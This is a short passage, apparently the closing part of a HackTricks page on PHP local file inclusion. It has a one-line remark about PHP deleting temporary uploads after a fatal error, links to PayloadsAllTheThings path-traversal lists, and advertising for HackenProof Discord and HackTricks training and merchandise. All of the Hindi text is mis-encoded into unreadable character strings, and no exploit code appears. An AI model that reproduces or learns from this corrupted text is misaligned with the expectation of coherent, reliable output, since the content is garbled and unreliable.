_рдпрджрд┐ рдЖрдк PHP рдлреЗрдЯрд▓ рддреНрд░реБрдЯрд┐ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛рддреЗ рд╣реИрдВ, рддреЛ PHP рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣рдЯрд╛ рджреА рдЬрд╛рддреА рд╣реИрдВред_

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## рд╕рдВрджрд░реНрдн

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рд╕рдорд╛рдЪрд╛рд░**\
рддреЗрдЬреА рд╕реЗ рдмрджрд▓рддреЗ рд╣реБрдП рд╣реИрдХрд┐рдВрдЧ рд╡рд┐рд╢реНрд╡ рдХреЗ рд╕рд╛рде рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╕рдорд╛рдЪрд╛рд░ рдФрд░ рдЕрдВрджрд╛рдЬрд╝ рдореЗрдВ рд░рд╣реЗрдВ

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдВ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЕрдкрдбреЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдЕрд╡рдЧрдд рд░рд╣реЗрдВ

**рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
